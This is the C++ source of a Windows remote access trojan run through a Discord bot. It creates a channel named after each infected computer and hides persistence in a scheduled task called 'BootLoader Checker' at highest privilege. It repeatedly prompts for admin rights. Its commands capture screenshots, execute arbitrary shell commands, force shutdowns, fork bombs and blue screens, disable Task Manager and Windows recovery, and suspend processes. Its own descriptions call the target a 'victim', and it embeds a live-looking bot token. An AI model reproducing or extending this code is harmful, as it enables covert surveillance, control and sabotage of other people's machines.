#include <dpp/dpp.h>
#include <Windows.h>
#include <taskschd.h>
#include <comdef.h>
#include <filesystem>
#include <cstdlib>
#include <string>
#include <variant>
#include <stdlib.h>
#include <tlhelp32.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")


using namespace dpp;

// Declare temp directory temp = C://...../temp
std::filesystem::path temp = std::filesystem::temp_directory_path();

//shit to change
const long long int guildId = 1254187382140305408;
const std::string BOT_TOKEN = "MTI1NDE4NzU1OTQyNTQwOTEwNQ.Gm132A.xjuAMEV_NTmhvMymh5hr5ijKZ5R1kOwGixyH7I"; // please dont fuck my shit up :( ima change this before it i release or not idk if ill remember
const bool autostart = true;

// creates channel at startup
void suspend(const std::wstring& processName);
void Startup();
void getAdmin(HANDLE &hMutex);
long long int Channelid_CreateChannel;
void CreateChannel(dpp::cluster& bot, long long int &channellocationid);

int main() {
    HANDLE hMutex = CreateMutexA(NULL, TRUE, "Local\\BCFE3153-59B6-46B0-BA99-C17A9AD2E8D1");
    if (hMutex == NULL) {
        std::cout << "fail: " << GetLastError() << "\n";
        return 1;
    }

    // hhahhahhhah mutex goooo brrrrrrrr
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return 0;
    }

    cluster bot(BOT_TOKEN, i_default_intents | i_message_content);
    bot.on_log(utility::cout_logger());

    // check if your admin
    BOOL isAdmin = FALSE; // by default your not admin until it checks 
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup))
    {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }

    // attempt to add to startup
    if (autostart && isAdmin) {
        Startup();
    }
    else if (autostart && !isAdmin) {
        while (!isAdmin) { //lmfao spams you if it doesnt get admin 
            getAdmin(hMutex);
            // get admin will close the application and start it in admin so it wont have to try and add to task schedular
        }
    }
    else
    {
        std::cout << "skipping adding to startup \n";
    }


    CreateChannel(bot, Channelid_CreateChannel); // self explanitory lol

    // takes screenshot
    bot.on_slashcommand([](const dpp::slashcommand_t& event) {
        if (event.command.get_command_name() == "ss" && (event.command.channel_id == Channelid_CreateChannel)) {
            std::string screenshotpath = temp.string() += "screenshot.png";
            system("powershell Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $bitmap.Save([System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'screenshot.png')); $graphics.Dispose(); $bitmap.Dispose()");
            dpp::message msg(event.command.channel_id, "Image sent");
            msg.add_file("screenshot.png", dpp::utility::read_file(screenshotpath));
            event.reply(msg);
            std::string commanddeletess = "del " + screenshotpath;
            system(commanddeletess.c_str());
        }
        else {
            std::cout << "not for me \n";
        }
        });

    // slash command for running commands
    bot.on_slashcommand([](const dpp::slashcommand_t& event) {
        if (event.command.get_command_name() == "run" && (event.command.channel_id == Channelid_CreateChannel))
        {
            std::string Runslashcommand = std::get<std::string>(event.get_parameter("command"));

            FILE* pipe = _popen(Runslashcommand.c_str(), "r");
            char buffer[128];
            std::string RunCommandresult;
            while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
                RunCommandresult += buffer;
            }
            _pclose(pipe);
            event.reply(RunCommandresult);
        }
        else {
            std::cout << "not for me \n";
        }
        });

    // shutdown
    bot.on_slashcommand([](const dpp::slashcommand_t& event) {
        if (event.command.get_command_name() == "shutdown" && (event.command.channel_id == Channelid_CreateChannel))
        {
            event.reply("executing");
            system("shutdown /s /f /t 0");
        }
        else {
            std::cout << "not for me \n";
        }
        });

    // restart
    bot.on_slashcommand([](const dpp::slashcommand_t& event) {
        if (event.command.get_command_name() == "restart" && (event.command.channel_id == Channelid_CreateChannel))
        {
            event.reply("executing");
            system("shutdown /r /f /t 0");
        }
        else {
            std::cout << "not for me \n";
        }
        });

    // forkbomb
    bot.on_slashcommand([](const dpp::slashcommand_t& event) {
        if (event.command.get_command_name() == "forkbomb" && (event.command.channel_id == Channelid_CreateChannel)) {
            std::string Forkbombtype = std::get<std::string>(event.get_parameter("type"));
            event.reply("executting.... " + Forkbombtype);

            // i know this is horrible but it works so fuck you
            if (Forkbombtype == "percentzero") {
                system("start echo %0^|%0 > $_.cmd % $_ > nul");
            }
            else if (Forkbombtype == "cmd")
            {
                while (true) {
                    system("start");
                }
            }
            else if (Forkbombtype == "Powershell")
            {
                while (true) {
                    system("start powershell");
                }
            }
            else if (Forkbombtype == "Mega")
            {
                while (true) {
                    system("start powershell");
                    system("start");
                    system("start echo %0^|%0 > $_.cmd % $_ > nul");
                }
            }
            else if (Forkbombtype == "rickroll") 
            {
                 system("start curl ASCII.live/can-you-hear-me");
            }
            
        } 
        else {
            std::cout << "not for me \n";
        }
        });

    // kill itself
    bot.on_slashcommand([&hMutex](const dpp::slashcommand_t& event) {
        if (event.command.get_command_name() == "kill" && (event.command.channel_id == Channelid_CreateChannel))
        {
            event.reply("Exiting");
            ReleaseMutex(hMutex);
            CloseHandle(hMutex);
            exit(0);
        }
        else {
            std::cout << "not for me \n";
        }
        });

    // request admin
    bot.on_slashcommand([&hMutex, isAdmin](const dpp::slashcommand_t& event) {
        if (event.command.get_command_name() == "getadmin" && (event.command.channel_id == Channelid_CreateChannel))
        {
            if (!isAdmin) {
                event.reply("attempting..... (if successful a new session with admin will open)");
                getAdmin(hMutex);
            }
            else if (isAdmin)
            {
                event.reply("you are already admin");
            }
        }
        else
        {
            std::cout << "not for me";
        }
        });

    // bsod
    bot.on_slashcommand([](const dpp::slashcommand_t& event) {
        if (event.command.get_command_name() == "bsod" && (event.command.channel_id == Channelid_CreateChannel))
        {
            BOOLEAN bEnabled;
            ULONG uResp;
            LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
            LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
            pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
            pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
            NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
            NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
        }
        else {
            std::cout << "not for me \n";
        }
        });

    // enable tskmanger
    bot.on_slashcommand([isAdmin](const dpp::slashcommand_t& event) {
        if (event.command.get_command_name() == "enabletaskmanager" && (event.command.channel_id == Channelid_CreateChannel)) {
            if (isAdmin) {
            event.reply("attempting to enable task manager");
            const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
            const char* regValueName = "DisableTaskMgr";
            DWORD EnableValue = 0;
            HKEY hKey;
            DWORD disposition;
            RegCreateKeyExA(HKEY_CURRENT_USER, regPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE | KEY_WOW64_64KEY, NULL, &hKey, &disposition);
            RegSetValueExA(hKey, regValueName, 0, REG_DWORD, (const BYTE*)&EnableValue, sizeof(DWORD));
            RegCloseKey(hKey);
            } 
            else if (!isAdmin) 
            {
                event.reply("you are not admin you need admin to run this command run /getadmin");
            }
        }
        else {
            std::cout << "not for me\n";
        }
        });

    // disable tskmanger
    bot.on_slashcommand([isAdmin](const dpp::slashcommand_t& event) {
        if (event.command.get_command_name() == "disabletaskmanager" && (event.command.channel_id == Channelid_CreateChannel)) {
            if (isAdmin) {
                event.reply("attempting to disable task manager");
                const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
                const char* regValueName = "DisableTaskMgr";
                DWORD disableValue = 1;
                HKEY hKey;
                DWORD disposition;
                RegCreateKeyExA(HKEY_CURRENT_USER, regPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE | KEY_WOW64_64KEY, NULL, &hKey, &disposition);
                RegSetValueExA(hKey, regValueName, 0, REG_DWORD, (const BYTE*)&disableValue, sizeof(DWORD));
                RegCloseKey(hKey);
            }
            else if (!isAdmin) {
                event.reply("you are not admin you need admin to run this command run /getadmin");
            }
        }
        else {
            std::cout << "not for me\n";
        }
        });

    // disable reset
    bot.on_slashcommand([isAdmin](const dpp::slashcommand_t& event) {
        if (event.command.get_command_name() == "disablereset" && (event.command.channel_id == Channelid_CreateChannel)) {
            if (isAdmin) {
                event.reply("running command to disable reset");
                system("powershell REAGENTC.EXE /disable");
            }
            else if (!isAdmin) {
                event.reply("you are not admin you need admin to run this command run /getadmin");
            }
        }
        else {
            std::cout << "not for me\n";
        }
        });

    // enable reset
    bot.on_slashcommand([isAdmin](const dpp::slashcommand_t& event) {
        if (event.command.get_command_name() == "enablereset" && (event.command.channel_id == Channelid_CreateChannel)) {
            if (isAdmin) {
                event.reply("attempting to enable reset now");
                system("powershell REAGENTC.EXE /enable");
            }
            else if (!isAdmin) {
                event.reply("you are not admin you need admin to run this command run /getadmin");
            }
        }
        else {
            std::cout << "not for me\n";
        }
        });

    // suspend process
    bot.on_slashcommand([](const dpp::slashcommand_t& event) {
        if (event.command.get_command_name() == "pause" && (event.command.channel_id == Channelid_CreateChannel))
        {
            std::string processforsuspend = std::get<std::string>(event.get_parameter("process"));
            // suspend(processforsuspend); // todo fix
        }
        else {
            std::cout << "not for me \n";
        }
        });

    // send all commands and stuff
    bot.on_ready([&bot, &isAdmin](const dpp::ready_t& event) {
        if (dpp::run_once<struct register_bot_commands>()) {

            std::string Commandrun;
            bot.global_command_create(dpp::slashcommand("ss", "Takes a screenshot", bot.me.id));
            bot.global_command_create(dpp::slashcommand("shutdown", "shutdowns victims pc", bot.me.id));
            bot.global_command_create(dpp::slashcommand("restart", "restarts victims pc", bot.me.id));
            bot.global_command_create(dpp::slashcommand("kill", "Kills itself (doesnt remove from startup)", bot.me.id));
            bot.global_command_create(dpp::slashcommand("getadmin", "sends a request to get admin and restarts application as admin", bot.me.id));
            bot.global_command_create(dpp::slashcommand("bsod", "BlueScreens the computer usermode or admin", bot.me.id));
            bot.global_command_create(dpp::slashcommand("disabletaskmanager", "disables taskmanger must have admin", bot.me.id));
            bot.global_command_create(dpp::slashcommand("enabletaskmanager", "enables task manager must have admin", bot.me.id));
            bot.global_command_create(dpp::slashcommand("disablereset", "Disables ability to reset pc without a usb", bot.me.id));
            bot.global_command_create(dpp::slashcommand("enablereset", "Disables ability to reset pc without a usb", bot.me.id));

            // stuff to create run command so you can input data type shit
            dpp::slashcommand runCommandslash("run", "Run a command in cmd", bot.me.id);
            runCommandslash.add_option(
                dpp::command_option(dpp::co_string, "command", "Command to run in Cmd", true)
            );
            bot.global_command_create(runCommandslash);

            // suspend process
            dpp::slashcommand suspendprocesscommand("pause", "pauses a running executable", bot.me.id);
            suspendprocesscommand.add_option(
                dpp::command_option(dpp::co_string, "process", "Suspends the process input it like svchost.exe how it apears in taskmanger ", true)
            );
            bot.global_command_create(suspendprocesscommand);

            // forkbomb shit
            dpp::slashcommand Forkbomb_command("forkbomb", "Forkbombs a victims computer", bot.me.id);
            Forkbomb_command.add_option(
                dpp::command_option(dpp::co_string, "type", "The type of forkbomb cant decide pick mega", true)
                .add_choice(dpp::command_option_choice("%0", std::string("percentzero")))
                .add_choice(dpp::command_option_choice("cmd", std::string("cmd")))
                .add_choice(dpp::command_option_choice("powershell", std::string("Powershell")))
                .add_choice(dpp::command_option_choice("Mega", std::string("Mega")))
                .add_choice(dpp::command_option_choice("RickRoll", std::string("rickroll")))
            );
            bot.global_command_create(Forkbomb_command);

            bot.message_create(dpp::message()
                .set_channel_id(Channelid_CreateChannel)
                .set_content("Session started Admin : " + std::to_string(isAdmin)));
        }
        });


    bot.start(dpp::st_wait);

    return 0;
}

// Create channel at start
void CreateChannel(dpp::cluster& bot, long long int &channellocationid) {
    // get computer name (works now idk why, thanks chatgpt)
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    dpp::channel new_channel{};
    if (GetComputerNameA(computerName, &size)) {

    }

    new_channel.set_name(computerName)
        .set_type(dpp::CHANNEL_TEXT)
        .set_guild_id(guildId);
    bot.channel_create(new_channel, [&bot, &channellocationid](const dpp::confirmation_callback_t& channel_callback) {
        if (channel_callback.is_error()) {
            bot.log(dpp::ll_error, channel_callback.get_error().human_readable);
            return;
        }
        auto created_channel = channel_callback.get<dpp::channel>();
        channellocationid = created_channel.id;
        });
}

// starts daily and on user log on
void Startup() {
    // get the full path of the executable
    wchar_t buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH);
    std::wstring executablePath = std::wstring(buffer);

    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    ITaskService* pService = NULL;
    CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);

    // connect to task scheduler
    pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());

    // get root folder
    ITaskFolder* pRootFolder = NULL;
    pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);

    // delete if already exists
    pRootFolder->DeleteTask(_bstr_t(L"BootLoader Checker"), 0);

    // create a new task
    ITaskDefinition* pTask = NULL;
    pService->NewTask(0, &pTask);

    // set the registration info for the task
    IRegistrationInfo* pRegInfo = NULL;
    pTask->get_RegistrationInfo(&pRegInfo);
    BSTR authorName = SysAllocString(L"HelloWorld0000red"); // Author name
    pRegInfo->put_Author(authorName);
    SysFreeString(authorName);
    pRegInfo->Release();

    // set the principal for the task
    IPrincipal* pPrincipal = NULL;
    pTask->get_Principal(&pPrincipal);
    pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
    pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);  // run with highest privilege typ shit
    pPrincipal->Release();

    // set the task settings
    ITaskSettings* pSettings = NULL;
    pTask->get_Settings(&pSettings);
    pSettings->put_StartWhenAvailable(VARIANT_TRUE);
    pSettings->put_Hidden(VARIANT_TRUE);
    pSettings->put_RunOnlyIfNetworkAvailable(VARIANT_TRUE);
    pSettings->put_Enabled(VARIANT_TRUE);
    pSettings->Release();

    // create a daily trigger for the task
    ITriggerCollection* pTriggerCollection = NULL;
    pTask->get_Triggers(&pTriggerCollection);
    ITrigger* pTrigger = NULL;
    pTriggerCollection->Create(TASK_TRIGGER_DAILY, &pTrigger);
    IDailyTrigger* pDailyTrigger = NULL;
    pTrigger->QueryInterface(IID_IDailyTrigger, (void**)&pDailyTrigger);
    pDailyTrigger->put_StartBoundary(_bstr_t(L"2024-01-01T00:00:00"));
    pDailyTrigger->put_EndBoundary(_bstr_t(L"6969-12-31T23:59:59")); // end time
    pDailyTrigger->put_ExecutionTimeLimit(_bstr_t(L"PT0S"));
    pDailyTrigger->put_DaysInterval(1);
    pDailyTrigger->put_Enabled(VARIANT_TRUE);
    pDailyTrigger->Release();
    pTrigger->Release();

    // create a logon trigger for the task
    pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
    ILogonTrigger* pLogonTrigger = NULL;
    pTrigger->QueryInterface(IID_ILogonTrigger, (void**)&pLogonTrigger);
    pLogonTrigger->put_StartBoundary(_bstr_t(L"2024-01-01T00:00:00"));
    pLogonTrigger->put_EndBoundary(_bstr_t(L"6969-12-31T23:59:59"));  // end time
    pLogonTrigger->put_Enabled(VARIANT_TRUE);
    pLogonTrigger->Release();
    pTrigger->Release();
    pTriggerCollection->Release();

    // create an action for the task to run the executable
    IActionCollection* pActionCollection = NULL;
    pTask->get_Actions(&pActionCollection);
    IAction* pAction = NULL;
    pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
    IExecAction* pExecAction = NULL;
    pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
    pExecAction->put_Path(_bstr_t(executablePath.c_str()));
    pExecAction->Release();
    pAction->Release();
    pActionCollection->Release();

    // register the task
    IRegisteredTask* pRegisteredTask = NULL;
    pRootFolder->RegisterTaskDefinition(
        _bstr_t(L"BootLoader Checker"),
        pTask,
        TASK_CREATE_OR_UPDATE,
        _variant_t(),
        _variant_t(),
        TASK_LOGON_INTERACTIVE_TOKEN,
        _variant_t(L""),
        &pRegisteredTask
    );

    if (pRegisteredTask) pRegisteredTask->Release();
    if (pRootFolder) pRootFolder->Release();
    if (pTask) pTask->Release();
    if (pService) pService->Release();
    CoUninitialize();
}


void getAdmin(HANDLE &hMutex) {
        wchar_t szPath[MAX_PATH];
        if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath)))
        {
            SHELLEXECUTEINFO sei = { sizeof(sei) };
            sei.lpVerb = L"runas";
            sei.lpFile = szPath;
            sei.hwnd = NULL;
            sei.nShow = SW_NORMAL;
            if (ShellExecuteEx(&sei))
            {
                ReleaseMutex(hMutex);
                CloseHandle(hMutex);
                exit(0);
            }
        }
}

void suspend(const std::wstring& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return;
    }

    do {
        if (processName == pe32.szExeFile) {
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
            if (hProcess == nullptr) continue;

            auto pfnNtSuspendProcess = reinterpret_cast<LONG(NTAPI*)(HANDLE)>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtSuspendProcess"));
            if (!pfnNtSuspendProcess) {
                CloseHandle(hProcess);
                continue;
            }

            pfnNtSuspendProcess(hProcess);
            CloseHandle(hProcess);
        }
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
}

